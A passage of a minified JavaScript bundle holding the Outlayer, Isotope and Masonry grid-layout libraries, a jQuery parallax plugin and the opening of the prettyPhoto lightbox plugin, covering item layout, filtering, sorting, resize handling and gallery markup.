o=++g;this.element.outlayerGUID=o,v[o]=this,this._create(),this.options.isInitLayout&&this.layout()}else r&&r.error("Bad "+this.constructor.namespace+" element: "+t)}var g=0,v={};return m.namespace="outlayer",m.Item=f,m.defaults={containerStyle:{position:"relative"},isInitLayout:!0,isOriginLeft:!0,isOriginTop:!0,isResizeBound:!0,isResizingContainer:!0,transitionDuration:"0.4s",hiddenStyle:{opacity:0,transform:"scale(0.001)"},visibleStyle:{opacity:1,transform:"scale(1)"}},e(m.prototype,u.prototype),m.prototype.option=function(t){e(this.options,t)},m.prototype._create=function(){this.reloadItems(),this.stamps=[],this.stamp(this.options.stamp),e(this.element.style,this.options.containerStyle),this.options.isResizeBound&&this.bindResize()},m.prototype.reloadItems=function(){this.items=this._itemize(this.element.children)},m.prototype._itemize=function(t){for(var e=this._filterFindItemElements(t),i=this.constructor.Item,o=[],n=0,s=e.length;s>n;n++){var r=new i(e[n],this);o.push(r)}return o},m.prototype._filterFindItemElements=function(t){t=i(t);for(var e=this.options.itemSelector,o=[],n=0,s=t.length;s>n;n++){var r=t[n];if(p(r))if(e){h(r,e)&&o.push(r);for(var a=r.querySelectorAll(e),l=0,c=a.length;c>l;l++)o.push(a[l])}else o.push(r)}return o},m.prototype.getItemElements=function(){for(var t=[],e=0,i=this.items.length;i>e;e++)t.push(this.items[e].element);return t},m.prototype.layout=function(){this._resetLayout(),this._manageStamps();var t=void 0!==this.options.isLayoutInstant?this.options.isLayoutInstant:!this._isLayoutInited;this.layoutItems(this.items,t),this._isLayoutInited=!0},m.prototype._init=m.prototype.layout,m.prototype._resetLayout=function(){this.getSize()},m.prototype.getSize=function(){this.size=d(this.element)},m.prototype._getMeasurement=function(t,e){var i,o=this.options[t];o?("string"==typeof o?i=this.element.querySelector(o):p(o)&&(i=o),this[t]=i?d(i)[e]:o):this[t]=0},m.prototype.layoutItems=function(t,e){t=this._getItemsForLayout(t),this._layoutItems(t,e),this._postLayout()},m.prototype._getItemsForLayout=function(t){for(var e=[],i=0,o=t.length;o>i;i++){var n=t[i];n.isIgnored||e.push(n)}return e},m.prototype._layoutItems=function(t,e){function i(){o.emitEvent("layoutComplete",[o,t])}var o=this;if(t&&t.length){this._itemsOn(t,"layout",i);for(var n=[],s=0,r=t.length;r>s;s++){var a=t[s],l=this._getItemLayoutPosition(a);l.item=a,l.isInstant=e||a.isLayoutInstant,n.push(l)}this._processLayoutQueue(n)}else i()},m.prototype._getItemLayoutPosition=function(){return{x:0,y:0}},m.prototype._processLayoutQueue=function(t){for(var e=0,i=t.length;i>e;e++){var o=t[e];this._positionItem(o.item,o.x,o.y,o.isInstant)}},m.prototype._positionItem=function(t,e,i,o){o?t.goTo(e,i):t.moveTo(e,i)},m.prototype._postLayout=function(){this.resizeContainer()},m.prototype.resizeContainer=function(){if(this.options.isResizingContainer){var t=this._getContainerSize();t&&(this._setContainerMeasure(t.width,!0),this._setContainerMeasure(t.height,!1))}},m.prototype._getContainerSize=l,m.prototype._setContainerMeasure=function(t,e){if(void 0!==t){var i=this.size;i.isBorderBox&&(t+=e?i.paddingLeft+i.paddingRight+i.borderLeftWidth+i.borderRightWidth:i.paddingBottom+i.paddingTop+i.borderTopWidth+i.borderBottomWidth),t=Math.max(t,0),this.element.style[e?"width":"height"]=t+"px"}},m.prototype._itemsOn=function(t,e,i){function o(){return++n===s&&i.call(r),!0}for(var n=0,s=t.length,r=this,a=0,l=t.length;l>a;a++){t[a].on(e,o)}},m.prototype.ignore=function(t){var e=this.getItem(t);e&&(e.isIgnored=!0)},m.prototype.unignore=function(t){var e=this.getItem(t);e&&delete e.isIgnored},m.prototype.stamp=function(t){if(t=this._find(t)){this.stamps=this.stamps.concat(t);for(var e=0,i=t.length;i>e;e++){var o=t[e];this.ignore(o)}}},m.prototype.unstamp=function(t){if(t=this._find(t))for(var e=0,i=t.length;i>e;e++){var n=t[e];o(n,this.stamps),this.unignore(n)}},m.prototype._find=function(t){return t?("string"==typeof t&&(t=this.element.querySelectorAll(t)),t=i(t)):void 0},m.prototype._manageStamps=function(){if(this.stamps&&this.stamps.length){this._getBoundingRect();for(var t=0,e=this.stamps.length;e>t;t++){var i=this.stamps[t];this._manageStamp(i)}}},m.prototype._getBoundingRect=function(){var t=this.element.getBoundingClientRect(),e=this.size;this._boundingRect={left:t.left+e.paddingLeft+e.borderLeftWidth,top:t.top+e.paddingTop+e.borderTopWidth,right:t.right-(e.paddingRight+e.borderRightWidth),bottom:t.bottom-(e.paddingBottom+e.borderBottomWidth)}},m.prototype._manageStamp=l,m.prototype._getElementOffset=function(t){var e=t.getBoundingClientRect(),i=this._boundingRect,o=d(t);return{left:e.left-i.left-o.marginLeft,top:e.top-i.top-o.marginTop,right:i.right-e.right-o.marginRight,bottom:i.bottom-e.bottom-o.marginBottom}},m.prototype.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},m.prototype.bindResize=function(){this.isResizeBound||(n.bind(t,"resize",this),this.isResizeBound=!0)},m.prototype.unbindResize=function(){this.isResizeBound&&n.unbind(t,"resize",this),this.isResizeBound=!1},m.prototype.onresize=function(){this.resizeTimeout&&clearTimeout(this.resizeTimeout);var t=this;this.resizeTimeout=setTimeout((function(){t.resize(),delete t.resizeTimeout}),100)},m.prototype.resize=function(){this.isResizeBound&&this.needsResizeLayout()&&this.layout()},m.prototype.needsResizeLayout=function(){var t=d(this.element);return this.size&&t&&t.innerWidth!==this.size.innerWidth},m.prototype.addItems=function(t){var e=this._itemize(t);return e.length&&(this.items=this.items.concat(e)),e},m.prototype.appended=function(t){var e=this.addItems(t);e.length&&(this.layoutItems(e,!0),this.reveal(e))},m.prototype.prepended=function(t){var e=this._itemize(t);if(e.length){var i=this.items.slice(0);this.items=e.concat(i),this._resetLayout(),this._manageStamps(),this.layoutItems(e,!0),this.reveal(e),this.layoutItems(i)}},m.prototype.reveal=function(t){var e=t&&t.length;if(e)for(var i=0;e>i;i++){t[i].reveal()}},m.prototype.hide=function(t){var e=t&&t.length;if(e)for(var i=0;e>i;i++){t[i].hide()}},m.prototype.getItem=function(t){for(var e=0,i=this.items.length;i>e;e++){var o=this.items[e];if(o.element===t)return o}},m.prototype.getItems=function(t){if(t&&t.length){for(var e=[],i=0,o=t.length;o>i;i++){var n=t[i],s=this.getItem(n);s&&e.push(s)}return e}},m.prototype.remove=function(t){t=i(t);var e=this.getItems(t);if(e&&e.length){this._itemsOn(e,"remove",(function(){this.emitEvent("removeComplete",[this,e])}));for(var n=0,s=e.length;s>n;n++){var r=e[n];r.remove(),o(r,this.items)}}},m.prototype.destroy=function(){var t=this.element.style;t.height="",t.position="",t.width="";for(var e=0,i=this.items.length;i>e;e++){this.items[e].destroy()}this.unbindResize();var o=this.element.outlayerGUID;delete v[o],delete this.element.outlayerGUID,a&&a.removeData(this.element,this.constructor.namespace)},m.data=function(t){var e=t&&t.outlayerGUID;return e&&v[e]},m.create=function(t,i){function o(){m.apply(this,arguments)}return Object.create?o.prototype=Object.create(m.prototype):e(o.prototype,m.prototype),o.prototype.constructor=o,o.defaults=e({},m.defaults),e(o.defaults,i),o.prototype.settings={},o.namespace=t,o.data=m.data,o.Item=function(){f.apply(this,arguments)},o.Item.prototype=new f,c((function(){for(var e=function(t){return t.replace(/(.)([A-Z])/g,(function(t,e,i){return e+"-"+i})).toLowerCase()}(t),i=s.querySelectorAll(".js-"+e),n="data-"+e+"-options",l=0,c=i.length;c>l;l++){var p,u=i[l],d=u.getAttribute(n);try{p=d&&JSON.parse(d)}catch(t){r&&r.error("Error parsing "+n+" on "+u.nodeName.toLowerCase()+(u.id?"#"+u.id:"")+": "+t);continue}var h=new o(u,p);a&&a.data(u,t,h)}})),a&&a.bridget&&a.bridget(t,o),o},m.Item=f,m}var s=t.document,r=t.console,a=t.jQuery,l=function(){},c=Object.prototype.toString,p="function"==typeof HTMLElement||"object"==typeof HTMLElement?function(t){return t instanceof HTMLElement}:function(t){return t&&"object"==typeof t&&1===t.nodeType&&"string"==typeof t.nodeName},u=Array.prototype.indexOf?function(t,e){return t.indexOf(e)}:function(t,e){for(var i=0,o=t.length;o>i;i++)if(t[i]===e)return i;return-1};"function"==typeof define&&define.amd?define("outlayer/outlayer",["eventie/eventie","doc-ready/doc-ready","eventEmitter/EventEmitter","get-size/get-size","matches-selector/matches-selector","./item"],n):"object"==typeof exports?module.exports=n(require("eventie"),require("doc-ready"),require("wolfy87-eventemitter"),require("get-size"),require("desandro-matches-selector"),require("./item")):t.Outlayer=n(t.eventie,t.docReady,t.EventEmitter,t.getSize,t.matchesSelector,t.Outlayer.Item)}(window),function(t){function e(t){function e(){t.Item.apply(this,arguments)}e.prototype=new t.Item,e.prototype._create=function(){this.id=this.layout.itemGUID++,t.Item.prototype._create.call(this),this.sortData={}},e.prototype.updateSortData=function(){if(!this.isIgnored){this.sortData.id=this.id,this.sortData["original-order"]=this.id,this.sortData.random=Math.random();var t=this.layout.options.getSortData,e=this.layout._sorters;for(var i in t){var o=e[i];this.sortData[i]=o(this.element,this)}}};var i=e.prototype.destroy;return e.prototype.destroy=function(){i.apply(this,arguments),this.css({display:""})},e}"function"==typeof define&&define.amd?define("isotope/js/item",["outlayer/outlayer"],e):"object"==typeof exports?module.exports=e(require("outlayer")):(t.Isotope=t.Isotope||{},t.Isotope.Item=e(t.Outlayer))}(window),function(t){function e(t,e){function i(t){this.isotope=t,t&&(this.options=t.options[this.namespace],this.element=t.element,this.items=t.filteredItems,this.size=t.size)}return function(){function t(t){return function(){return e.prototype[t].apply(this.isotope,arguments)}}for(var o=["_resetLayout","_getItemLayoutPosition","_manageStamp","_getContainerSize","_getElementOffset","needsResizeLayout"],n=0,s=o.length;s>n;n++){var r=o[n];i.prototype[r]=t(r)}}(),i.prototype.needsVerticalResizeLayout=function(){var e=t(this.isotope.element);return this.isotope.size&&e&&e.innerHeight!==this.isotope.size.innerHeight},i.prototype._getMeasurement=function(){this.isotope._getMeasurement.apply(this,arguments)},i.prototype.getColumnWidth=function(){this.getSegmentSize("column","Width")},i.prototype.getRowHeight=function(){this.getSegmentSize("row","Height")},i.prototype.getSegmentSize=function(t,e){var i=t+e,o="outer"+e;if(this._getMeasurement(i,o),!this[i]){var n=this.getFirstItemSize();this[i]=n&&n[o]||this.isotope.size["inner"+e]}},i.prototype.getFirstItemSize=function(){var e=this.isotope.filteredItems[0];return e&&e.element&&t(e.element)},i.prototype.layout=function(){this.isotope.layout.apply(this.isotope,arguments)},i.prototype.getSize=function(){this.isotope.getSize(),this.size=this.isotope.size},i.modes={},i.create=function(t,e){function o(){i.apply(this,arguments)}return o.prototype=new i,e&&(o.options=e),o.prototype.namespace=t,i.modes[t]=o,o},i}"function"==typeof define&&define.amd?define("isotope/js/layout-mode",["get-size/get-size","outlayer/outlayer"],e):"object"==typeof exports?module.exports=e(require("get-size"),require("outlayer")):(t.Isotope=t.Isotope||{},t.Isotope.LayoutMode=e(t.getSize,t.Outlayer))}(window),function(t){function e(t,e){var o=t.create("masonry");return o.prototype._resetLayout=function(){this.getSize(),this._getMeasurement("columnWidth","outerWidth"),this._getMeasurement("gutter","outerWidth"),this.measureColumns();var t=this.cols;for(this.colYs=[];t--;)this.colYs.push(0);this.maxY=0},o.prototype.measureColumns=function(){if(this.getContainerWidth(),!this.columnWidth){var t=this.items[0],i=t&&t.element;this.columnWidth=i&&e(i).outerWidth||this.containerWidth}this.columnWidth+=this.gutter,this.cols=Math.floor((this.containerWidth+this.gutter)/this.columnWidth),this.cols=Math.max(this.cols,1)},o.prototype.getContainerWidth=function(){var t=this.options.isFitWidth?this.element.parentNode:this.element,i=e(t);this.containerWidth=i&&i.innerWidth},o.prototype._getItemLayoutPosition=function(t){t.getSize();var e=t.size.outerWidth%this.columnWidth,o=Math[e&&1>e?"round":"ceil"](t.size.outerWidth/this.columnWidth);o=Math.min(o,this.cols);for(var n=this._getColGroup(o),s=Math.min.apply(Math,n),r=i(n,s),a={x:this.columnWidth*r,y:s},l=s+t.size.outerHeight,c=this.cols+1-n.length,p=0;c>p;p++)this.colYs[r+p]=l;return a},o.prototype._getColGroup=function(t){if(2>t)return this.colYs;for(var e=[],i=this.cols+1-t,o=0;i>o;o++){var n=this.colYs.slice(o,o+t);e[o]=Math.max.apply(Math,n)}return e},o.prototype._manageStamp=function(t){var i=e(t),o=this._getElementOffset(t),n=this.options.isOriginLeft?o.left:o.right,s=n+i.outerWidth,r=Math.floor(n/this.columnWidth);r=Math.max(0,r);var a=Math.floor(s/this.columnWidth);a-=s%this.columnWidth?0:1,a=Math.min(this.cols-1,a);for(var l=(this.options.isOriginTop?o.top:o.bottom)+i.outerHeight,c=r;a>=c;c++)this.colYs[c]=Math.max(l,this.colYs[c])},o.prototype._getContainerSize=function(){this.maxY=Math.max.apply(Math,this.colYs);var t={height:this.maxY};return this.options.isFitWidth&&(t.width=this._getContainerFitWidth()),t},o.prototype._getContainerFitWidth=function(){for(var t=0,e=this.cols;--e&&0===this.colYs[e];)t++;return(this.cols-t)*this.columnWidth-this.gutter},o.prototype.needsResizeLayout=function(){var t=this.containerWidth;return this.getContainerWidth(),t!==this.containerWidth},o}var i=Array.prototype.indexOf?function(t,e){return t.indexOf(e)}:function(t,e){for(var i=0,o=t.length;o>i;i++){if(t[i]===e)return i}return-1};"function"==typeof define&&define.amd?define("masonry/masonry",["outlayer/outlayer","get-size/get-size"],e):"object"==typeof exports?module.exports=e(require("outlayer"),require("get-size")):t.Masonry=e(t.Outlayer,t.getSize)}(window),function(t){function e(t,e){var i=t.create("masonry"),o=i.prototype._getElementOffset,n=i.prototype.layout,s=i.prototype._getMeasurement;(function(t,e){for(var i in e)t[i]=e[i]})(i.prototype,e.prototype),i.prototype._getElementOffset=o,i.prototype.layout=n,i.prototype._getMeasurement=s;var r=i.prototype.measureColumns;i.prototype.measureColumns=function(){this.items=this.isotope.filteredItems,r.call(this)};var a=i.prototype._manageStamp;return i.prototype._manageStamp=function(){this.options.isOriginLeft=this.isotope.options.isOriginLeft,this.options.isOriginTop=this.isotope.options.isOriginTop,a.apply(this,arguments)},i}"function"==typeof define&&define.amd?define("isotope/js/layout-modes/masonry",["../layout-mode","masonry/masonry"],e):"object"==typeof exports?module.exports=e(require("../layout-mode"),require("masonry-layout")):e(t.Isotope.LayoutMode,t.Masonry)}(window),function(t){function e(t){var e=t.create("fitRows");return e.prototype._resetLayout=function(){this.x=0,this.y=0,this.maxY=0,this._getMeasurement("gutter","outerWidth")},e.prototype._getItemLayoutPosition=function(t){t.getSize();var e=t.size.outerWidth+this.gutter,i=this.isotope.size.innerWidth+this.gutter;0!==this.x&&e+this.x>i&&(this.x=0,this.y=this.maxY);var o={x:this.x,y:this.y};return this.maxY=Math.max(this.maxY,this.y+t.size.outerHeight),this.x+=e,o},e.prototype._getContainerSize=function(){return{height:this.maxY}},e}"function"==typeof define&&define.amd?define("isotope/js/layout-modes/fit-rows",["../layout-mode"],e):"object"==typeof exports?module.exports=e(require("../layout-mode")):e(t.Isotope.LayoutMode)}(window),function(t){function e(t){var e=t.create("vertical",{horizontalAlignment:0});return e.prototype._resetLayout=function(){this.y=0},e.prototype._getItemLayoutPosition=function(t){t.getSize();var e=(this.isotope.size.innerWidth-t.size.outerWidth)*this.options.horizontalAlignment,i=this.y;return this.y+=t.size.outerHeight,{x:e,y:i}},e.prototype._getContainerSize=function(){return{height:this.y}},e}"function"==typeof define&&define.amd?define("isotope/js/layout-modes/vertical",["../layout-mode"],e):"object"==typeof exports?module.exports=e(require("../layout-mode")):e(t.Isotope.LayoutMode)}(window),function(t){function e(t){var e=[];if(function(t){return"[object Array]"===a.call(t)}(t))e=t;else if(t&&"number"==typeof t.length)for(var i=0,o=t.length;o>i;i++)e.push(t[i]);else e.push(t);return e}function i(t,e){var i=l(e,t);-1!==i&&e.splice(i,1)}function o(t,o,a,l,c){var p=t.create("isotope",{layoutMode:"masonry",isJQueryFiltering:!0,sortAscending:!0});p.Item=l,p.LayoutMode=c,p.prototype._create=function(){for(var e in this.itemGUID=0,this._sorters={},this._getSorters(),t.prototype._create.call(this),this.modes={},this.filteredItems=this.items,this.sortHistory=["original-order"],c.modes)this._initLayoutMode(e)},p.prototype.reloadItems=function(){this.itemGUID=0,t.prototype.reloadItems.call(this)},p.prototype._itemize=function(){for(var e=t.prototype._itemize.apply(this,arguments),i=0,o=e.length;o>i;i++){var n=e[i];n.id=this.itemGUID++}return this._updateItemsSortData(e),e},p.prototype._initLayoutMode=function(t){var e=c.modes[t],i=this.options[t]||{};this.options[t]=e.options?function(t,e){for(var i in e)t[i]=e[i];return t}(e.options,i):i,this.modes[t]=new e(this)},p.prototype.layout=function(){return!this._isLayoutInited&&this.options.isInitLayout?void this.arrange():void this._layout()},p.prototype._layout=function(){var t=this._getIsInstant();this._resetLayout(),this._manageStamps(),this.layoutItems(this.filteredItems,t),this._isLayoutInited=!0},p.prototype.arrange=function(t){this.option(t),this._getIsInstant(),this.filteredItems=this._filter(this.items),this._sort(),this._layout()},p.prototype._init=p.prototype.arrange,p.prototype._getIsInstant=function(){var t=void 0!==this.options.isLayoutInstant?this.options.isLayoutInstant:!this._isLayoutInited;return this._isInstant=t,t},p.prototype._filter=function(t){function e(){u.reveal(n),u.hide(s)}var i=this.options.filter;i=i||"*";for(var o=[],n=[],s=[],r=this._getFilterTest(i),a=0,l=t.length;l>a;a++){var c=t[a];if(!c.isIgnored){var p=r(c);p&&o.push(c),p&&c.isHidden?n.push(c):p||c.isHidden||s.push(c)}}var u=this;return this._isInstant?this._noTransition(e):e(),o},p.prototype._getFilterTest=function(t){return n&&this.options.isJQueryFiltering?function(e){return n(e.element).is(t)}:"function"==typeof t?function(e){return t(e.element)}:function(e){return a(e.element,t)}},p.prototype.updateSortData=function(t){var i;t?(t=e(t),i=this.getItems(t)):i=this.items,this._getSorters(),this._updateItemsSortData(i)},p.prototype._getSorters=function(){var t=this.options.getSortData;for(var e in t){var i=t[e];this._sorters[e]=u(i)}},p.prototype._updateItemsSortData=function(t){for(var e=t&&t.length,i=0;e&&e>i;i++){t[i].updateSortData()}};var u=function(t){if("string"!=typeof t)return t;var e=s(t).split(" "),i=e[0],o=i.match(/^\[(.+)\]$/),n=function(t,e){return t?function(e){return e.getAttribute(t)}:function(t){var i=t.querySelector(e);return i&&r(i)}}(o&&o[1],i),a=p.sortDataParsers[e[1]];return a?function(t){return t&&a(n(t))}:function(t){return t&&n(t)}};p.sortDataParsers={parseInt:function(t){return parseInt(t,10)},parseFloat:function(t){return parseFloat(t)}},p.prototype._sort=function(){var t=this.options.sortBy;if(t){var e=function(t,e){return function(i,o){for(var n=0,s=t.length;s>n;n++){var r=t[n],a=i.sortData[r],l=o.sortData[r];if(a>l||l>a)return(a>l?1:-1)*((void 0!==e[r]?e[r]:e)?1:-1)}return 0}}([].concat.apply(t,this.sortHistory),this.options.sortAscending);this.filteredItems.sort(e),t!==this.sortHistory[0]&&this.sortHistory.unshift(t)}},p.prototype._mode=function(){var t=this.options.layoutMode,e=this.modes[t];if(!e)throw Error("No layout mode: "+t);return e.options=this.options[t],e},p.prototype._resetLayout=function(){t.prototype._resetLayout.call(this),this._mode()._resetLayout()},p.prototype._getItemLayoutPosition=function(t){return this._mode()._getItemLayoutPosition(t)},p.prototype._manageStamp=function(t){this._mode()._manageStamp(t)},p.prototype._getContainerSize=function(){return this._mode()._getContainerSize()},p.prototype.needsResizeLayout=function(){return this._mode().needsResizeLayout()},p.prototype.appended=function(t){var e=this.addItems(t);if(e.length){var i=this._filterRevealAdded(e);this.filteredItems=this.filteredItems.concat(i)}},p.prototype.prepended=function(t){var e=this._itemize(t);if(e.length){var i=this.items.slice(0);this.items=e.concat(i),this._resetLayout(),this._manageStamps();var o=this._filterRevealAdded(e);this.layoutItems(i),this.filteredItems=o.concat(this.filteredItems)}},p.prototype._filterRevealAdded=function(t){var e=this._noTransition((function(){return this._filter(t)}));return this.layoutItems(e,!0),this.reveal(e),t},p.prototype.insert=function(t){var e=this.addItems(t);if(e.length){var i,o,n=e.length;for(i=0;n>i;i++)o=e[i],this.element.appendChild(o.element);var s=this._filter(e);for(this._noTransition((function(){this.hide(s)})),i=0;n>i;i++)e[i].isLayoutInstant=!0;for(this.arrange(),i=0;n>i;i++)delete e[i].isLayoutInstant;this.reveal(s)}};var d=p.prototype.remove;return p.prototype.remove=function(t){t=e(t);var o=this.getItems(t);if(d.call(this,t),o&&o.length)for(var n=0,s=o.length;s>n;n++){i(o[n],this.filteredItems)}},p.prototype.shuffle=function(){for(var t=0,e=this.items.length;e>t;t++){this.items[t].sortData.random=Math.random()}this.options.sortBy="random",this._sort(),this._layout()},p.prototype._noTransition=function(t){var e=this.options.transitionDuration;this.options.transitionDuration=0;var i=t.call(this);return this.options.transitionDuration=e,i},p.prototype.getFilteredItemElements=function(){for(var t=[],e=0,i=this.filteredItems.length;i>e;e++)t.push(this.filteredItems[e].element);return t},p}var n=t.jQuery,s=String.prototype.trim?function(t){return t.trim()}:function(t){return t.replace(/^\s+|\s+$/g,"")},r=document.documentElement.textContent?function(t){return t.textContent}:function(t){return t.innerText},a=Object.prototype.toString,l=Array.prototype.indexOf?function(t,e){return t.indexOf(e)}:function(t,e){for(var i=0,o=t.length;o>i;i++)if(t[i]===e)return i;return-1};"function"==typeof define&&define.amd?define(["outlayer/outlayer","get-size/get-size","matches-selector/matches-selector","isotope/js/item","isotope/js/layout-mode","isotope/js/layout-modes/masonry","isotope/js/layout-modes/fit-rows","isotope/js/layout-modes/vertical"],o):"object"==typeof exports?module.exports=o(require("outlayer"),require("get-size"),require("desandro-matches-selector"),require("./item"),require("./layout-mode"),require("./layout-modes/masonry"),require("./layout-modes/fit-rows"),require("./layout-modes/vertical")):t.Isotope=o(t.Outlayer,t.getSize,t.matchesSelector,t.Isotope.Item,t.Isotope.LayoutMode)}(window),function(t){"use strict";t.fn.enllax=function(e){var i=t(window).height(),o=t(document).height(),n=t.extend({ratio:0,type:"background",direction:"vertical"},e);t("[data-enllax-ratio]").each((function(){var e,s,r,a=t(this),l=a.offset().top,c=a.outerHeight(),p=a.data("enllax-ratio"),u=a.data("enllax-type"),d=a.data("enllax-direction");e=p||n.ratio,s=u||n.type,r=d||n.direction;var h=Math.round(l*e),f=Math.round((l-i/2+c)*e);"background"==s?"vertical"==r?a.css({"background-position":"center "+-h+"px"}):"horizontal"==r&&a.css({"background-position":-h+"px center"}):"foreground"==s&&("vertical"==r?a.css({"-webkit-transform":"translateY("+f+"px)","-moz-transform":"translateY("+f+"px)",transform:"translateY("+f+"px)"}):"horizontal"==r&&a.css({"-webkit-transform":"translateX("+f+"px)","-moz-transform":"translateX("+f+"px)",transform:"translateX("+f+"px)"})),t(window).on("scroll",(function(){var n=t(this).scrollTop();h=Math.round((l-n)*e),f=Math.round((l-i/2+c-n)*e),"background"==s?"vertical"==r?a.css({"background-position":"center "+-h+"px"}):"horizontal"==r&&a.css({"background-position":-h+"px center"}):"foreground"==s&&o>n&&("vertical"==r?a.css({"-webkit-transform":"translateY("+f+"px)","-moz-transform":"translateY("+f+"px)",transform:"translateY("+f+"px)"}):"horizontal"==r&&a.css({"-webkit-transform":"translateX("+f+"px)","-moz-transform":"translateX("+f+"px)",transform:"translateX("+f+"px)"}))}))}))}}(jQuery),function(t){function e(){var t=location.href;return hashtag=-1!==t.indexOf("#prettyPhoto")&&decodeURI(t.substring(t.indexOf("#prettyPhoto")+1,t.length)),hashtag&&(hashtag=hashtag.replace(/<|>/g,"")),hashtag}function i(){"undefined"!=typeof theRel&&(location.hash=theRel+"/"+rel_index+"/")}function o(t,e){t=t.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var i=new RegExp("[\\?&]"+t+"=([^&#]*)").exec(e);return null==i?"":i[1]}t.prettyPhoto={version:"3.1.6"},t.fn.prettyPhoto=function(n){function s(){t(".pp_loaderIcon").hide(),projectedTop=scroll_pos.scrollTop+(S/2-f.containerHeight/2),projectedTop<0&&(projectedTop=0),$ppt.fadeTo(settings.animation_speed,1),$pp_pic_holder.find(".pp_content").animate({height:f.contentHeight,width:f.contentWidth},settings.animation_speed),$pp_pic_holder.animate({top:projectedTop,left:z/2-f.containerWidth/2<0?0:z/2-f.containerWidth/2,width:f.containerWidth},settings.animation_speed,(function(){$pp_pic_holder.find(".pp_hoverContainer,#fullResImage").height(f.height).width(f.width),$pp_pic_holder.find(".pp_fade").fadeIn(settings.animation_speed),isSet&&"image"==p(pp_images[set_position])?$pp_pic_holder.find(".pp_hoverContainer").show():$pp_pic_holder.find(".pp_hoverContainer").hide(),settings.allow_expand&&(f.resized?t("a.pp_expand,a.pp_contract").show():t("a.pp_expand").hide()),!settings.autoplay_slideshow||b||m||t.prettyPhoto.startSlideshow(),settings.changepicturecallback(),m=!0})),isSet&&settings.overlay_gallery&&"image"==p(pp_images[set_position])?(itemWidth=57,navWidth="facebook"==settings.theme||"pp_default"==settings.theme?50:30,itemsPerPage=Math.floor((f.containerWidth-100-navWidth)/itemWidth),itemsPerPage=itemsPerPage<pp_images.length?itemsPerPage:pp_images.length,totalPage=Math.ceil(pp_images.length/itemsPerPage)-1,0==totalPage?(navWidth=0,$pp_gallery.find(".pp_arrow_next,.pp_arrow_previous").hide()):$pp_gallery.find(".pp_arrow_next,.pp_arrow_previous").show(),galleryWidth=itemsPerPage*itemWidth,fullGalleryWidth=pp_images.length*itemWidth,$pp_gallery.css("margin-left",-(galleryWidth/2+navWidth/2)).find("div:first").width(galleryWidth+5).find("ul").width(fullGalleryWidth).find("li.selected").removeClass("selected"),goToPage=Math.floor(set_position/itemsPerPage)<totalPage?Math.floor(set_position/itemsPerPage):totalPage,t.prettyPhoto.changeGalleryPage(goToPage),$pp_gallery_li.filter(":eq("+set_position+")").addClass("selected")):$pp_pic_holder.find(".pp_content").unbind("mouseenter mouseleave"),n.ajaxcallback()}function r(e){$pp_pic_holder.find("#pp_full_res object,#pp_full_res embed").css("visibility","hidden"),$pp_pic_holder.find(".pp_fade").fadeOut(settings.animation_speed,(function(){t(".pp_loaderIcon").show(),e()}))}function a(e){e>1?t(".pp_nav").show():t(".pp_nav").hide()}function l(t,e){if(resized=!1,c(t,e),imageWidth=t,imageHeight=e,(y>z||_>S)&&doresize&&settings.allow_resize&&!x){for(resized=!0,fitting=!1;!fitting;)y>z?(imageWidth=z-200,imageHeight=e/t*imageWidth):_>S?(imageHeight=S-200,imageWidth=t/e*imageHeight):fitting=!0,_=imageHeight,y=imageWidth;(y>z||_>S)&&l(y,_),c(imageWidth,imageHeight)}return{width:Math.floor(imageWidth),height:Math.floor(imageHeight),containerHeight:Math.floor(_),containerWidth:Math.floor(y)+2*settings.horizontal_padding,contentHeight:Math.floor(g),contentWidth:Math.floor(v),resized:resized}}function c(e,i){e=parseFloat(e),i=parseFloat(i),$pp_details=$pp_pic_holder.find(".pp_details"),$pp_details.width(e),detailsHeight=parseFloat($pp_details.css("marginTop"))+parseFloat($pp_details.css("marginBottom")),$pp_details=$pp_details.clone().addClass(settings.theme).width(e).appendTo(t("body")).css({position:"absolute",top:-1e4}),detailsHeight+=$pp_details.height(),detailsHeight=detailsHeight<=34?36:detailsHeight,$pp_details.remove(),$pp_title=$pp_pic_holder.find(".ppt"),$pp_title.width(e),titleHeight=parseFloat($pp_title.css("marginTop"))+parseFloat($pp_title.css("marginBottom")),$pp_title=$pp_title.clone().appendTo(t("body")).css({position:"absolute",top:-1e4}),titleHeight+=$pp_title.height(),$pp_title.remove(),g=i+detailsHeight,v=e,_=g+titleHeight+$pp_pic_holder.find(".pp_top").height()+$pp_pic_holder.find(".pp_bottom").height(),y=e}function p(t){return t.match(/youtube\.com\/watch/i)||t.match(/youtu\.be/i)?"youtube":t.match(/vimeo\.com/i)?"vimeo":t.match(/\b.mov\b/i)?"quicktime":t.match(/\b.swf\b/i)?"flash":t.match(/\biframe=true\b/i)?"iframe":t.match(/\bajax=true\b/i)?"ajax":t.match(/\bcustom=true\b/i)?"custom":"#"==t.substr(0,1)?"inline":"image"}function u(){if(doresize&&"undefined"!=typeof $pp_pic_holder){if(scroll_pos=d(),contentHeight=$pp_pic_holder.height(),contentwidth=$pp_pic_holder.width(),projectedTop=S/2+scroll_pos.scrollTop-contentHeight/2,projectedTop<0&&(projectedTop=0),contentHeight>S)return;$pp_pic_holder.css({top:projectedTop,left:z/2+scroll_pos.scrollLeft-contentwidth/2})}}function d(){return self.pageYOffset?{scrollTop:self.pageYOffset,scrollLeft:self.pageXOffset}:document.documentElement&&document.documentElement.scrollTop?{scrollTop:document.documentElement.scrollTop,scrollLeft:document.documentElement.scrollLeft}:document.body?{scrollTop:document.body.scrollTop,scrollLeft:document.body.scrollLeft}:void 0}function h(){if(settings.social_tools&&(facebook_like_link=settings.social_tools.replace("{location_href}",encodeURIComponent(location.href))),settings.markup=settings.markup.replace("{pp_social}",""),t("body").append(settings.markup),$pp_pic_holder=t(".pp_pic_holder"),$ppt=t(".ppt"),$pp_overlay=t("div.pp_overlay"),isSet&&settings.overlay_gallery){currentGalleryPage=0,toInject="";for(var e=0;e<pp_images.length;e++)pp_images[e].match(/\b(jpg|jpeg|png|gif)\b/gi)?(classname="",img_src=pp_images[e]):(classname="default",img_src=""),toInject+="<li class='"+classname+"'><a href='#'><img src='"+img_src+"' width='50' alt='' /></a></li>";toInject=settings.gallery_markup.replace(/{gallery}/g,toInject),$pp_pic_holder.find("#pp_full_res").after(toInject),$pp_gallery=t(".pp_pic_holder .pp_gallery"),$pp_gallery_li=$pp_gallery.find("li"),$pp_gallery.find(".pp_arrow_next").click((function(){return t.prettyPhoto.changeGalleryPage("next"),t.prettyPhoto.stopSlideshow(),!1})),$pp_gallery.find(".pp_arrow_previous").click((function(){return 